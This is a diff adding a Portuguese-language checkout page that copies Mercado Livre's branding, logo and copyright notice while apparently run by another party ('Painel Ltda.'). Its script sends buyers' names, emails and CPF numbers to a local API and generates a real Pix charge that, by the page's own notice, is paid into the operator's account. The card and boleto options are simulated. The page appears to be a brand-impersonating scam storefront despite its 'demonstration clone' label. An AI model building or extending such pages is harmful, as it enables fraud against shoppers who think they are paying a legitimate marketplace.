@@ -1,0 +1,585 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Pagamento | Mercado Livre</title>
+<link rel="stylesheet" href="assets/css/estilo.css">
+<link rel="stylesheet" href="assets/css/loja-local.css">
+<script src="assets/js/topo-site.js"></script>
+<script src="assets/js/loja-local.js" data-root=""></script>
+</head>
+<body class="ll-body">
+<header class="ml-produto-topo-mobile">
+  <div class="ml-produto-topo-mobile-linha">
+    <a href="#" onclick="openWithWhiteSpinnerLink(this);return false;" data-href="index.html" class="ml-produto-topo-mobile-logo" aria-label="Página inicial">
+      <img src="assets/ml-handshake-transparent.png/logo01.png" alt="Mercado Livre">
+    </a>
+
+    <form class="ml-produto-topo-mobile-busca" method="get" action="busca.html">
+      <svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="10.8" cy="10.8" r="6.4"/><path d="m16 16 4.1 4.1"/></svg>
+      <input type="text" name="q" aria-label="Buscar" placeholder="Estou buscando..." value="">
+    </form>
+
+    <button class="ml-produto-topo-mobile-menu" type="button" aria-label="Abrir menu" aria-expanded="false" aria-controls="ml-produto-menu">
+      <svg class="icon-hamburguer" viewBox="0 0 24 24" aria-hidden="true"><path d="M4 6.5h16M4 12h16M4 17.5h16"/></svg>
+      <svg class="icon-fechar" viewBox="0 0 24 24" aria-hidden="true" style="display:none;"><path d="M6 6l12 12M18 6L6 18"/></svg>
+    </button>
+
+    <a href="carrinho.html" class="ml-produto-topo-mobile-carrinho" aria-label="Carrinho">
+      <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M2 3h2.5l2.1 11.2a2 2 0 0 0 2 1.6h9.1a2 2 0 0 0 1.9-1.4L21 8H6"/><circle cx="9" cy="20" r="1"/><circle cx="18" cy="20" r="1"/></svg>
+          </a>
+  </div>
+
+  <button type="button" data-cep-trigger class="ml-produto-topo-mobile-endereco" style="background:none;border:0;border-top:1px solid rgba(0,0,0,.12);padding:0 10px 0 8px;cursor:pointer;text-align:left;width:100%;display:flex;align-items:center;gap:4px;min-width:0;overflow:hidden;">
+    <svg viewBox="0 0 24 24" aria-hidden="true" style="flex:none"><path d="M20 10c0 5.5-8 11-8 11S4 15.5 4 10a8 8 0 0 1 16 0Z"/><circle cx="12" cy="10" r="2.6"/></svg>
+    <span style="min-width:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;display:block;flex:1 1 auto;">Informe seu CEP</span>
+    <svg class="ml-produto-topo-mobile-seta" viewBox="0 0 24 24" aria-hidden="true" style="flex:none"><path d="m9 18 6-6-6-6"/></svg>
+  </button>
+
+  <nav class="ml-produto-topo-mobile-painel" id="ml-produto-menu" hidden>
+    <a href="index.html" class="ml-menu-nav-item">
+      <i class="nav-icon-home"></i>
+      <span>Início</span>
+    </a>
+
+    
+        <details class="ml-menu-cats-details">
+      <summary class="ml-menu-nav-item ml-menu-cats-summary">
+        <i class="nav-icon-categories-mobile"></i>
+        <span>Categorias</span>
+        <svg class="ml-menu-cats-chevron" width="14" height="14" viewBox="0 0 24 24" fill="none" aria-hidden="true"><path d="M6 9l6 6 6-6" stroke="#333" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      </summary>
+      <div class="ml-menu-cats-lista">
+                <a href="busca/cat-eletrodom-sticos.html" class="ml-menu-cat-item">
+                      <span style="width:48px;height:48px;flex-shrink:0;border-radius:6px;background:#f5f5f5;display:inline-block;"></span>
+                    <span style="font-size:14px;color:#333;">Eletrodomésticos</span>
+        </a>
+                <a href="busca/cat-casa-m-veis-e-decora-o.html" class="ml-menu-cat-item">
+                      <span style="width:48px;height:48px;flex-shrink:0;border-radius:6px;background:#f5f5f5;display:inline-block;"></span>
+                    <span style="font-size:14px;color:#333;">Casa, Móveis e Decoração</span>
+        </a>
+                <a href="busca/cat-eletr-nicos-udio-e-v-deo.html" class="ml-menu-cat-item">
+                      <span style="width:48px;height:48px;flex-shrink:0;border-radius:6px;background:#f5f5f5;display:inline-block;"></span>
+                    <span style="font-size:14px;color:#333;">Eletrônicos, Áudio e Vídeo</span>
+        </a>
+                <a href="busca/cat-acess-rios-para-ve-culos.html" class="ml-menu-cat-item">
+                      <span style="width:48px;height:48px;flex-shrink:0;border-radius:6px;background:#f5f5f5;display:inline-block;"></span>
+                    <span style="font-size:14px;color:#333;">Acessórios para Veículos</span>
+        </a>
+                <a href="busca/cat-beb-s.html" class="ml-menu-cat-item">
+                      <span style="width:48px;height:48px;flex-shrink:0;border-radius:6px;background:#f5f5f5;display:inline-block;"></span>
+                    <span style="font-size:14px;color:#333;">Bebês</span>
+        </a>
+              </div>
+    </details>
+      </nav>
+</header>
+<header class="ml-topo ml-produto-topo-desktop">
+  <div class="ml-topo-inner">
+    <a href="#" onclick="openWithWhiteSpinnerLink(this);return false;" data-href="index.html" class="ml-logo">
+      <div class="ml-logo-icone">🤝</div>
+      <div class="ml-logo-texto">
+        <div>painel</div>
+        <div class="ml-logo-sub">livre</div>
+      </div>
+    </a>
+
+    <form class="ml-busca" method="get" action="busca.html">
+      <input type="text" name="q" placeholder="Buscar produtos, marcas e muito mais…" value="">
+      <button type="submit" aria-label="Buscar">🔍</button>
+    </form>
+
+    <div class="ml-usuario">
+              <a href="cadastro.html">Crie sua conta</a>
+        <a href="login.html">Entre</a>
+            <a href="carrinho.html" class="ml-carrinho" aria-label="Carrinho">
+        🛒      </a>
+    </div>
+  </div>
+
+  <div class="ml-cat">
+    <div class="ml-cat-inner">
+      <div style="margin-left:0;">
+      <button type="button" data-cep-trigger style="background:none;border:none;padding:0;cursor:pointer;display:flex;align-items:center;gap:4px;color:inherit;font:inherit;min-width:0;flex:0 1 auto;max-width:100%;white-space:nowrap;overflow:hidden;">
+        <span class="ml-cat-icone" style="flex:none">📍</span><span class="ml-cat-texto" style="min-width:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;display:block;max-width:100%;padding-right:8px;">Informe seu CEP</span>
+      </button>
+      </div>
+      <a href="busca/cat-ofertas.html">Ofertas</a>
+              <a href="busca/cat-eletrodom-sticos.html" >Eletrodomésticos</a>
+              <a href="busca/cat-casa-m-veis-e-decora-o.html" >Casa, Móveis e Decoração</a>
+              <a href="busca/cat-eletr-nicos-udio-e-v-deo.html" >Eletrônicos, Áudio e Vídeo</a>
+              <a href="busca/cat-acess-rios-para-ve-culos.html" >Acessórios para Veículos</a>
+              <a href="busca/cat-beb-s.html" >Bebês</a>
+            <a href="busca/cat-vender.html">Vender</a>
+      <a href="busca/cat-ajuda.html">Ajuda</a>
+    </div>
+  </div>
+</header>
+
+<main class="ll-wrap">
+  <h1>Pagamento</h1>
+  <div class="ll-aviso">Pix real gerado pela Medusa Payments (a cobrança aparece na conta do lojista). Cartão e boleto continuam simulados; nenhum dado de cartão é enviado.</div>
+
+  <div class="ll-cart-grid">
+    <section>
+      <div class="ll-card" id="ll-pagamento"></div>
+    </section>
+    <aside>
+      <div class="ll-card">
+        <h2 class="ll-resumo-titulo">Resumo do pedido</h2>
+        <div class="ll-mini" id="ll-pedido-id" style="margin-bottom:12px"></div>
+        <div id="ll-itens" class="ll-mini" style="margin-bottom:14px"></div>
+        <div class="ll-linha"><span>Produtos</span><span id="ll-sub"></span></div>
+        <div class="ll-linha"><span>Frete</span><span id="ll-frete" style="color:#00a650;font-weight:600">Grátis</span></div>
+        <div class="ll-linha total"><span>Total</span><span id="ll-tot"></span></div>
+        <a class="ll-btn secundario" href="carrinho.html">Editar carrinho</a>
+      </div>
+    </aside>
+  </div>
+</main>
+
+<footer class="ml-footer">
+  <div class="ml-footer-top">
+    <div class="ml-footer-col">
+      <h4>Sobre</h4>
+      <a href="#">Sobre nós</a>
+      <a href="#">Sustentabilidade</a>
+      <a href="#">Tendências</a>
+      <a href="#">Investidores</a>
+    </div>
+    <div class="ml-footer-col">
+      <h4>Outros sites</h4>
+      <a href="#">Envios</a>
+      <a href="#">Pagamentos</a>
+      <a href="#">Créditos</a>
+      <a href="#">Anúncios</a>
+    </div>
+    <div class="ml-footer-col">
+      <h4>Ajuda</h4>
+      <a href="#">Comprar</a>
+      <a href="#">Vender</a>
+      <a href="#">Resolução de problemas</a>
+      <a href="#">Central de segurança</a>
+    </div>
+    <div class="ml-footer-col">
+      <h4>Minha conta</h4>
+      <a href="minha-conta.html">Meus dados</a>
+      <a href="meus-pedidos.html">Meus pedidos</a>
+      <a href="favoritos.html">Favoritos</a>
+      <a href="carrinho.html">Carrinho</a>
+    </div>
+  </div>
+  <div class="ml-footer-bottom">
+    <div>Copyright © 2026 Painel Ltda.</div>
+    <div>Todos os direitos reservados.</div>
+  </div>
+</footer>
+<footer class="ml-footer-mobile-prod">
+  <div class="ml-footer-mobile-prod-topo">
+    <img src="assets/ml-handshake-transparent.png/logo01.png" alt="">
+    <span>Compre e venda no Mercado Livre</span>
+  </div>
+  <div class="ml-footer-mobile-prod-links">
+    <div><span>Minha conta</span><span>Compras</span></div>
+    <div><span>Histórico</span><span>Ofertas do dia</span></div>
+    <div><span>Favoritos</span><span>Lojas oficiais</span></div>
+    <div><span>Categorias</span><span>Meli+</span></div>
+    <div><span>Contato</span><span>Vender</span></div>
+  </div>
+  <div class="ml-footer-mobile-prod-divisor"></div>
+  <div class="ml-footer-mobile-prod-legal">
+    <p>
+      <a href="#">Termos e condições</a>
+      <a href="#">Como cuidamos da sua privacidade</a>
+      <a href="#">Acessibilidade</a>
+      <a href="#">Informações sobre seguros</a>
+      <a href="#">Blog</a>
+      <a href="#">Afiliados</a>
+      <a href="#">Tendências</a>
+    </p>
+    <p>© 1999-2024 Ebazar.com.br LTDA.</p>
+  </div>
+</footer>
+<div class="ll-rodape">Clone local de demonstração — Pix real via Medusa Payments; cartão e boleto simulados.</div>
+
+<script>
+(function () {
+  var LL = window.LojaLocal;
+  var pedido = null;
+  try { pedido = JSON.parse(localStorage.getItem(LL.keys.order)); } catch (e) {}
+  if (!pedido) { location.replace('carrinho.html'); return; }
+
+  document.getElementById('ll-pedido-id').textContent = 'Pedido ' + pedido.id;
+  document.getElementById('ll-itens').innerHTML = pedido.itens.map(function (i) {
+    return '<div style="display:flex;justify-content:space-between;gap:8px;margin-bottom:6px">' +
+      '<span style="overflow:hidden;text-overflow:ellipsis;white-space:nowrap">' + (i.qty || 1) + 'x ' + i.nome + '</span>' +
+      '<span style="white-space:nowrap">' + LL.brl(i.price * (i.qty || 1)) + '</span></div>';
+  }).join('');
+  document.getElementById('ll-sub').textContent = LL.brl(pedido.total - (pedido.frete || 0));
+  document.getElementById('ll-tot').textContent = LL.brl(pedido.total);
+  var fEl = document.getElementById('ll-frete');
+  if (pedido.frete > 0) {
+    fEl.textContent = LL.brl(pedido.frete);
+    fEl.style.color = '';
+    fEl.style.fontWeight = '400';
+  }
+
+  function luhn(n) {
+    var soma = 0, alterna = false;
+    for (var i = n.length - 1; i >= 0; i--) {
+      var d = parseInt(n.charAt(i), 10);
+      if (alterna) { d *= 2; if (d > 9) d -= 9; }
+      soma += d;
+      alterna = !alterna;
+    }
+    return soma % 10 === 0;
+  }
+
+  function validadeOk(v) {
+    var m = parseInt(v.slice(0, 2), 10);
+    var a = parseInt('20' + v.slice(3), 10);
+    if (!(m >= 1 && m <= 12) || isNaN(a)) return false;
+    var hoje = new Date();
+    return a > hoje.getFullYear() || (a === hoje.getFullYear() && m >= hoje.getMonth() + 1);
+  }
+
+  function finalizar() {
+    localStorage.setItem(LL.keys.last, JSON.stringify(pedido));
+    localStorage.removeItem(LL.keys.order);
+    localStorage.removeItem(LL.keys.cart);
+    location.href = 'pedido-confirmado.html';
+  }
+
+  function qrSvg(seed) {
+    var cells = 29, s = 220 / cells, out = '';
+    function rnd(i) { var x = Math.sin(seed * 7919 + i * 104729) * 10000; return x - Math.floor(x); }
+    function finder(x, y) {
+      [[0, 0], [cells - 7, 0], [0, cells - 7]].forEach(function (p) {
+        if (x >= p[0] && x < p[0] + 7 && y >= p[1] && y < p[1] + 7) {
+          var dx = x - p[0], dy = y - p[1];
+          var borda = dx === 0 || dy === 0 || dx === 6 || dy === 6;
+          var centro = dx >= 2 && dx <= 4 && dy >= 2 && dy <= 4;
+          if (borda || centro) out += '<rect x="' + (x * s) + '" y="' + (y * s) + '" width="' + s + '" height="' + s + '"/>';
+        }
+      });
+    }
+    for (var y = 0; y < cells; y++) {
+      for (var x = 0; x < cells; x++) {
+        if (rnd(y * cells + x) > 0.52) {
+          var perto = [[0, 0], [cells - 7, 0], [0, cells - 7]].some(function (p) {
+            return x >= p[0] - 1 && x <= p[0] + 7 && y >= p[1] - 1 && y <= p[1] + 7;
+          });
+          if (!perto) out += '<rect x="' + (x * s) + '" y="' + (y * s) + '" width="' + s + '" height="' + s + '"/>';
+        }
+      }
+    }
+    [[0, 0], [cells - 7, 0], [0, cells - 7]].forEach(function (p) {
+      out += '<rect x="' + (p[0] * s) + '" y="' + (p[1] * s) + '" width="' + (7 * s) + '" height="' + (7 * s) + '" fill="none" stroke="#000" stroke-width="' + s + '"/>';
+      out += '<rect x="' + ((p[0] + 2) * s) + '" y="' + ((p[1] + 2) * s) + '" width="' + (3 * s) + '" height="' + (3 * s) + '"/>';
+    });
+    return '<svg class="ll-pix-qr" viewBox="0 0 220 220" role="img" aria-label="QR Code Pix simulado"><rect width="220" height="220" fill="#fff"/><g fill="#111">' + out + '</g></svg>';
+  }
+
+  function boletoSvg(linha) {
+    var bars = '', x = 0;
+    for (var i = 0; i < linha.length; i++) {
+      var d = parseInt(linha.charAt(i), 10) || 0;
+      var w = 1 + (d % 3);
+      if (i % 2 === 0) bars += '<rect x="' + x + '" y="0" width="' + w + '" height="70"/>';
+      x += w + 1 + (d % 2);
+    }
+    return '<svg viewBox="0 0 ' + x + ' 70" preserveAspectRatio="none" style="width:100%;height:74px" role="img" aria-label="Código de barras simulado"><g fill="#111">' + bars + '</g></svg>';
+  }
+
+  var pixPoll = null;
+
+  function descricaoPix() {
+    var itens = pedido.itens || [];
+    if (!itens.length) return 'Pedido ' + pedido.id;
+    var primeiro = itens[0].nome || 'Pedido';
+    return itens.length > 1 ? primeiro + ' (+' + (itens.length - 1) + ' itens)' : primeiro;
+  }
+
+  function renderPix(host) {
+    clearInterval(pixPoll);
+    host.innerHTML =
+      '<h2 class="ll-step"><span class="ll-step-num">Pix</span> Pague com Pix</h2>' +
+      '<div class="ll-pix-box">' +
+        '<div id="ll-pix-carregando" class="ll-pix-carregando">' +
+          '<div class="ll-pix-spinner"></div>' +
+          '<p class="ll-mini">Gerando cobrança Pix na Medusa Payments...</p>' +
+        '</div>' +
+        '<div id="ll-pix-conteudo" hidden></div>' +
+      '</div>';
+    gerarPix(host);
+  }
+
+  function gerarPix(host) {
+    var cliente = pedido.cliente || {};
+    fetch('/api/pix', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        orderId: pedido.id,
+        valor: pedido.total,
+        clienteNome: cliente.nome || '',
+        clienteEmail: cliente.email || '',
+        clienteCpf: cliente.cpf || '',
+        produto: descricaoPix()
+      })
+    }).then(function (r) {
+      return r.json().then(function (d) { return { ok: r.ok, d: d }; });
+    }).then(function (res) {
+      if (!res.ok || !res.d || !res.d.ok) {
+        throw new Error((res.d && res.d.message) || 'Falha ao gerar o Pix');
+      }
+      pedido.pix = {
+        vendaId: res.d.vendaId,
+        valor: res.d.valor,
+        copiaECola: res.d.pixCopiaECola,
+        qrCode: res.d.pixQrCode,
+        simulada: res.d.simulada
+      };
+      mostrarPix(host, res.d);
+    }).catch(function (err) {
+      var carregando = document.getElementById('ll-pix-carregando');
+      var conteudo = document.getElementById('ll-pix-conteudo');
+      if (!carregando || !conteudo) return;
+      carregando.hidden = true;
+      conteudo.hidden = false;
+      conteudo.innerHTML =
+        '<div class="ll-pix-erro">' + (err.message || 'Falha ao gerar o Pix') + '</div>' +
+        '<button class="ll-btn" id="ll-pix-retry">Tentar novamente</button>' +
+        '<p class="ll-mini" style="margin-top:10px">Se estiver abrindo o clone, use o ' +
+        '<code>servidor.py</code> (o http.server puro não cria cobranças).</p>';
+      document.getElementById('ll-pix-retry').addEventListener('click', function () {
+        renderPix(host);
+      });
+    });
+  }
+
+  function mostrarPix(host, d) {
+    var carregando = document.getElementById('ll-pix-carregando');
+    var conteudo = document.getElementById('ll-pix-conteudo');
+    if (!carregando || !conteudo) return;
+    carregando.hidden = true;
+    conteudo.hidden = false;
+
+    var qr = d.pixQrCode
+      ? '<div class="ll-pix-qr-wrap"><img class="ll-pix-qr" src="' + d.pixQrCode + '" alt="QR Code Pix"></div>'
+      : '<div class="ll-pix-qr-wrap">' + qrSvg(pedido.total * 13 + 7) + '</div>' +
+        '<p class="ll-mini" style="color:#a15c00">Venda em modo teste: sem QR real, nada é cobrado.</p>';
+
+    conteudo.innerHTML =
+      '<p class="ll-timer">O código expira em <b id="ll-tempo">15:00</b></p>' +
+      qr +
+      '<p class="ll-mini">Escaneie o QR Code no app do seu banco ou use o código abaixo.</p>' +
+      '<div class="ll-codigo">' +
+        '<input readonly id="ll-copia" value="' + String(d.pixCopiaECola || '').replace(/"/g, '&quot;') + '">' +
+        '<button class="ll-btn" style="width:auto;margin:0;padding:0 16px" id="ll-copiar">Copiar</button>' +
+      '</div>' +
+      '<div class="ll-linha" style="margin-top:16px"><span>Valor</span><span><b>' + LL.brl(d.valor) + '</b></span></div>' +
+      '<div class="ll-linha"><span>Cobrança</span><span class="ll-mini">' + (d.vendaId || '—') + '</span></div>' +
+      '<button class="ll-btn" id="ll-pago">Já fiz o pagamento</button>' +
+      '<p class="ll-mini" id="ll-pix-status" style="text-align:center;margin-top:10px">Aguardando a confirmação da Medusa...</p>';
+
+    var resta = 15 * 60;
+    if (d.pixExpiresAt) {
+      var fim = new Date(d.pixExpiresAt).getTime();
+      var dif = Math.round((fim - Date.now()) / 1000);
+      if (isFinite(dif) && dif > 0) resta = Math.min(resta, dif);
+    }
+    var tempoEl = document.getElementById('ll-tempo');
+    var timer = setInterval(function () {
+      resta--;
+      if (!document.getElementById('ll-tempo')) { clearInterval(timer); return; }
+      if (resta <= 0) {
+        clearInterval(timer);
+        tempoEl.textContent = '00:00';
+        return;
+      }
+      var m = String(Math.floor(resta / 60)).padStart(2, '0');
+      var s = String(resta % 60).padStart(2, '0');
+      tempoEl.textContent = m + ':' + s;
+    }, 1000);
+
+    document.getElementById('ll-copiar').addEventListener('click', function () {
+      var inp = document.getElementById('ll-copia');
+      inp.select();
+      try { document.execCommand('copy'); } catch (e) {}
+      this.textContent = 'Copiado';
+      this.classList.add('ll-pop');
+      LL.toast('Código Pix copiado');
+    });
+
+    document.getElementById('ll-pago').addEventListener('click', function () {
+      this.classList.add('loading');
+      this.disabled = true;
+      this.textContent = 'Verificando pagamento...';
+      consultarPix(d.vendaId, true, this);
+    });
+
+    iniciarPolling(d.vendaId);
+  }
+
+  function iniciarPolling(vendaId) {
+    clearInterval(pixPoll);
+    if (!vendaId) return;
+    pixPoll = setInterval(function () { consultarPix(vendaId, false); }, 4000);
+  }
+
+  function consultarPix(vendaId, manual, botao) {
+    var statusEl = document.getElementById('ll-pix-status');
+    fetch('/api/pix/' + encodeURIComponent(vendaId))
+      .then(function (r) { return r.json(); })
+      .then(function (d) {
+        if (!d || !d.ok) {
+          if (manual) LL.toast((d && d.message) || 'Não foi possível consultar a cobrança');
+          if (botao) { botao.classList.remove('loading'); botao.disabled = false; botao.textContent = 'Já fiz o pagamento'; }
+          return;
+        }
+        if (d.status === 'aprovado') {
+          clearInterval(pixPoll);
+          pedido.pixStatus = 'aprovado';
+          if (statusEl) {
+            statusEl.textContent = 'Pagamento confirmado!';
+            statusEl.style.color = '#00a650';
+            statusEl.style.fontWeight = '600';
+          }
+          LL.toast('Pagamento Pix confirmado');
+          setTimeout(finalizar, 1200);
+        } else if (d.status === 'recusado' || d.status === 'estornado') {
+          clearInterval(pixPoll);
+          if (statusEl) {
+            statusEl.textContent = 'Pagamento ' + d.status + '.';
+            statusEl.style.color = '#d93025';
+          }
+          if (botao) { botao.classList.remove('loading'); botao.disabled = false; botao.textContent = 'Já fiz o pagamento'; }
+        } else {
+          if (statusEl) statusEl.textContent = 'Aguardando a confirmação da Medusa...';
+          if (manual) LL.toast('Ainda não identificamos o pagamento. O QR segue válido.');
+          if (botao) { botao.classList.remove('loading'); botao.disabled = false; botao.textContent = 'Já fiz o pagamento'; }
+        }
+      })
+      .catch(function () {
+        if (manual) LL.toast('Falha ao consultar o pagamento');
+        if (botao) { botao.classList.remove('loading'); botao.disabled = false; botao.textContent = 'Já fiz o pagamento'; }
+      });
+  }
+
+  function renderCartao(host) {
+    host.innerHTML =
+      '<h2 class="ll-step"><span class="ll-step-num">1</span> Dados do cartão</h2>' +
+      '<div class="ll-card-preview" id="ll-preview">' +
+        '<div class="brand" id="ll-brand">CARTÃO</div>' +
+        '<div class="num" id="ll-pnum">•••• •••• •••• ••••</div>' +
+        '<div class="row"><span id="ll-ptit">NOME NO CARTÃO</span><span id="ll-pval">MM/AA</span></div>' +
+      '</div>' +
+      '<form id="ll-cartao" class="ll-form" novalidate>' +
+        '<label for="num">Número do cartão</label>' +
+        '<input id="num" inputmode="numeric" placeholder="0000 0000 0000 0000" maxlength="19" required>' +
+        '<label for="titular">Nome impresso no cartão</label>' +
+        '<input id="titular" placeholder="Como está no cartão" required>' +
+        '<div class="ll-grid-3" style="grid-template-columns:1fr .8fr 1.7fr">' +
+          '<div><label for="val">Validade</label><input id="val" placeholder="MM/AA" maxlength="5" required></div>' +
+          '<div><label for="cvv">CVV</label><input id="cvv" inputmode="numeric" maxlength="4" placeholder="123" required></div>' +
+          '<div><label for="parc">Parcelas</label><select id="parc">' +
+            [1,2,3,4,5,6,7,8,9,10].map(function (n) {
+              return '<option value="' + n + '">' + n + 'x de ' + LL.brl(pedido.total / n) + ' sem juros</option>';
+            }).join('') +
+          '</select></div>' +
+        '</div>' +
+        '<div class="ll-erro" id="ll-erro-cartao">Confira os dados do cartão.</div>' +
+        '<button class="ll-btn" type="submit">Pagar ' + LL.brl(pedido.total) + '</button>' +
+      '</form>';
+    document.getElementById('num').addEventListener('input', function () {
+      var v = this.value.replace(/\D/g, '').slice(0, 16);
+      this.value = v.replace(/(\d{4})(?=\d)/g, '$1 ');
+      document.getElementById('ll-pnum').textContent = (v.replace(/(\d{4})(?=\d)/g, '$1 ') + ' •••• •••• •••• ••••').slice(0, 19);
+      var brand = 'CARTÃO';
+      if (/^4/.test(v)) brand = 'VISA';
+      else if (/^5[1-5]/.test(v)) brand = 'MASTERCARD';
+      else if (/^3[47]/.test(v)) brand = 'AMEX';
+      else if (/^(4011|4312|4389|5041|5066|5090|6277|6362|6363|650|651|655)/.test(v)) brand = 'ELO';
+      document.getElementById('ll-brand').textContent = brand;
+    });
+    document.getElementById('titular').addEventListener('input', function () {
+      document.getElementById('ll-ptit').textContent = (this.value || 'NOME NO CARTÃO').toUpperCase();
+    });
+    document.getElementById('val').addEventListener('input', function () {
+      var v = this.value.replace(/\D/g, '').slice(0, 4);
+      this.value = v.length > 2 ? v.slice(0, 2) + '/' + v.slice(2) : v;
+      document.getElementById('ll-pval').textContent = this.value || 'MM/AA';
+    });
+    document.getElementById('cvv').addEventListener('input', function () {
+      this.value = this.value.replace(/\D/g, '').slice(0, 4);
+    });
+    document.getElementById('ll-cartao').addEventListener('submit', function (ev) {
+      ev.preventDefault();
+      var erro = document.getElementById('ll-erro-cartao');
+      var numEl = document.getElementById('num');
+      var valEl = document.getElementById('val');
+      var cvvEl = document.getElementById('cvv');
+      var titEl = document.getElementById('titular');
+      var num = numEl.value.replace(/\D/g, '');
+      var val = valEl.value;
+      var cvv = cvvEl.value.replace(/\D/g, '');
+      var msg = '';
+      var campo = null;
+      if (num.length < 13 || !luhn(num)) { msg = 'Número de cartão inválido.'; campo = numEl; }
+      else if (val.length < 5 || !validadeOk(val)) { msg = 'Validade inválida. Use MM/AA.'; campo = valEl; }
+      else if (cvv.length < 3) { msg = 'CVV inválido.'; campo = cvvEl; }
+      else if (!titEl.value.trim()) { msg = 'Informe o nome impresso no cartão.'; campo = titEl; }
+      if (msg) {
+        erro.textContent = msg;
+        erro.classList.add('on');
+        [numEl, valEl, cvvEl, titEl].forEach(function (e) { e.classList.remove('invalido'); });
+        if (campo) { campo.classList.add('invalido'); campo.focus(); }
+        return;
+      }
+      erro.classList.remove('on');
+      var btn = this.querySelector('button[type=submit]');
+      btn.classList.add('loading');
+      btn.disabled = true;
+      btn.textContent = 'Processando...';
+      setTimeout(finalizar, 700);
+    });
+  }
+
+  function renderBoleto(host) {
+    var linha = '34191.79001 01043.510047 91020.150008 ' + String(pedido.total * 100 | 0) + '0';
+    host.innerHTML =
+      '<h2 class="ll-step"><span class="ll-step-num">1</span> Boleto bancário</h2>' +
+      '<div class="ll-boleto ll-boleto-linha" id="ll-linha-box">' +
+        boletoSvg(linha.replace(/\D/g, '')) +
+        '<p style="font-size:13px;margin:14px 0 4px"><b>' + linha + '</b></p>' +
+        '<p class="ll-mini">Vencimento em ' + new Date(Date.now() + 3 * 864e5).toLocaleDateString('pt-BR') + ' · Valor ' + LL.brl(pedido.total) + '</p>' +
+        '<p class="ll-mini">Clique na linha digitável para copiar</p>' +
+      '</div>' +
+      '<button class="ll-btn secundario" id="ll-imprimir">Imprimir boleto</button>' +
+      '<button class="ll-btn" id="ll-concluir">Concluir pedido</button>';
+    document.getElementById('ll-imprimir').addEventListener('click', function () { window.print(); });
+    document.getElementById('ll-linha-box').addEventListener('click', function () {
+      try {
+        navigator.clipboard.writeText(linha);
+        LL.toast('Linha digitável copiada');
+      } catch (e) {}
+    });
+    document.getElementById('ll-concluir').addEventListener('click', function () {
+      this.classList.add('loading');
+      this.disabled = true;
+      this.textContent = 'Registrando pedido...';
+      setTimeout(finalizar, 700);
+    });
+  }
+
+  var host = document.getElementById('ll-pagamento');
+  host.classList.add('ll-section');
+  if (pedido.metodo === 'cartao') renderCartao(host);
+  else if (pedido.metodo === 'boleto') renderBoleto(host);
+  else renderPix(host);
+})();
+</script>
+</body>
+</html>
